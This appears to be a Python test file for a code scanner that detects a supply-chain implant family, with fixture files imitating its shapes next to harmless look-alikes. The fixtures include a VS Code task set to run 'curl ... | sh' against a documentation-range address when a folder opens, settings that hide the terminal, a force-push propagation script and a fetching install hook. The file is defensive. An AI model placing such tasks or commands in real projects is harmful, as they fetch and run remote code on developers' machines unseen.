"""The supply-chain implant family (PolinRider, section 28) in `aix code security`, `--history` and `aix doctor`:
code after whitespace padding in a config file, code after the export, a second export, createRequire; the published
markers; a VS Code task on folder open and the settings that hide it; text where a font should be; the propagation
scripts and the .gitignore line hiding them; an install hook that fetches code; the note on npm install steps; a
config file that grew twenty-fold in one commit; a folder-open task in the project reported by doctor. Every shape
has its safe twin: a legitimate large config, a binary font, a plain install hook, an npm ci with --ignore-scripts."""
import subprocess, unittest

from helpers import env, install, project_cmd, temp_home

LOADER = "x" * 40   # stands for the obfuscated code; no real payload in this repository
FILES = {
    "src/next.config.mjs": "const config = { reactStrictMode: true };\nexport default config;" + " " * 280 + "global['_Q']='1';" + LOADER + "\n",
    "src/postcss.config.mjs": "const config = { plugins: {} };\nexport default config;\nconst extra = 1;\n",
    "src/tailwind.config.js": "const { createRequire } = require('module');\nmodule.exports = { content: [] };\nmodule.exports = { content: [] };\n",
    "src/vite.config.ts": "import { defineConfig } from 'vite';\n" + "\n".join(f"// a legitimate long config, line {i}" for i in range(80)) + "\nexport default defineConfig({\n  plugins: [],\n});\n",
    "src/marker.js": "// a comment that mentions the campaign's marker\nglobal['_V']='A4-1928';\n",
    ".vscode/tasks.json": '{\n  "version": "2.0.0",\n  "tasks": [\n    { "label": "sync", "type": "shell", "command": "curl -s http://198.51.100.7/x | sh", "runOptions": { "runOn": "folderOpen" } }\n  ]\n}\n',
    ".vscode/settings.json": '{\n  "task.allowAutomaticTasks": "on",\n  "terminal.integrated.hideOnStartup": "always"\n}\n',
    "public/fonts/fa-solid-900.woff2": "function _0x1(){ return 1 }\n",
    "public/fonts/fa-solid-300.llf": "var a = 1;\n",
    "temp_auto_push.bat": "@echo off\ngit push --force\n",
    ".gitignore": "node_modules\nconfig.bat\n",
    "package.json": '{\n  "name": "app",\n  "scripts": {\n    "postinstall": "node -e \\"require(\'https\')\\"",\n    "build": "vite build"\n  }\n}\n',
    "lib/package.json": '{\n  "name": "lib",\n  "scripts": {\n    "postinstall": "node scripts/build-native.js"\n  }\n}\n',
    ".github/workflows/ci.yml": "jobs:\n  build:\n    steps:\n      - run: npm ci\n      - run: npm ci --ignore-scripts\n",
}


class Implants(unittest.TestCase):
    def setUp(self):
        self.home = temp_home(self); self.project = self.home / "app"
        for rel, text in FILES.items():
            (self.project / rel).parent.mkdir(parents=True, exist_ok=True)
            (self.project / rel).write_text(text, encoding="utf-8")
        (self.project / "public/fonts/real.woff2").write_bytes(b"wOF2" + bytes(range(64)))
        (self.project / "public/fonts/icons.svg").write_text('<?xml version="1.0"?>\n<svg><font id="icons"/></svg>\n')
        install(self.home, self.project)
        self.out = project_cmd(self.project, self.home, "code", "security", check=False).stdout

    def test_config_files(self):
        out = self.out
        self.assertRegex(out, r"src/next\.config\.mjs:2  code hidden after whitespace padding", out)
        self.assertRegex(out, r"src/postcss\.config\.mjs:3  code after the export", out)
        self.assertRegex(out, r"src/tailwind\.config\.js:1  createRequire", out)
        self.assertRegex(out, r"src/tailwind\.config\.js:3  a second export", out)
        self.assertNotRegex(out, r"src/vite\.config\.ts:\d+", "a long legitimate config is not a finding\n" + out)
        self.assertRegex(out, r"src/marker\.js:2  known marker of the PolinRider implant", out)
        self.assertNotRegex(out, r"src/marker\.js:1\b", "the marker in a comment is stripped before the rules\n" + out)

    def test_editor_fonts_scripts_hooks(self):
        out = self.out
        self.assertRegex(out, r"\.vscode/tasks\.json:4  VS Code task that runs when the folder opens", out)
        self.assertRegex(out, r"\.vscode/tasks\.json:4  VS Code task that runs fetched or inline code", out)
        self.assertRegex(out, r"\.vscode/settings\.json:2  VS Code setting", out)
        self.assertRegex(out, r"public/fonts/fa-solid-900\.woff2:1  text where a font should be", out)
        self.assertRegex(out, r"public/fonts/fa-solid-300\.llf:1  text where a font should be", out)
        self.assertNotRegex(out, r"public/fonts/real\.woff2", "a binary font is a font\n" + out)
        self.assertNotRegex(out, r"public/fonts/icons\.svg", "an SVG font is text by its format\n" + out)
        self.assertRegex(out, r"temp_auto_push\.bat:1  propagation script", out)
        self.assertRegex(out, r"\.gitignore:2  a \.gitignore line hiding", out)
        self.assertRegex(out, r"package\.json:4  install hook that fetches or decodes code", out)
        self.assertNotRegex(out, r"lib/package\.json:\d+  install hook", "a hook that runs a project script is not a finding\n" + out)
        self.assertIn("1 npm install step(s) in workflows or Dockerfiles run lifecycle scripts", out, out)

    def test_history_and_doctor(self):
        git = ["git", "-c", "user.name=t", "-c", "user.email=t@t"]
        subprocess.run([*git, "init", "-q"], cwd=self.project, env=env(self.home))
        (self.project / "src/astro.config.mjs").write_text("export default {};\n")
        subprocess.run([*git, "add", "src/astro.config.mjs"], cwd=self.project, env=env(self.home)); subprocess.run([*git, "commit", "-q", "-m", "small"], cwd=self.project, env=env(self.home))
        (self.project / "src/astro.config.mjs").write_text("export default {};\n" + "// padding\n" * 300)
        subprocess.run([*git, "commit", "-q", "-am", "grown"], cwd=self.project, env=env(self.home))
        out = project_cmd(self.project, self.home, "code", "vulnerabilities", "--history", "src", check=False).stdout
        self.assertRegex(out, r"src/astro\.config\.mjs:1  config file grew from \d+ to \d+ bytes in one commit", out)
        doctor = project_cmd(self.project, self.home, "doctor", check=False).stdout
        self.assertIn("PROBLEM .vscode/tasks.json runs a task when the folder opens", doctor, doctor)


if __name__ == "__main__":
    unittest.main()
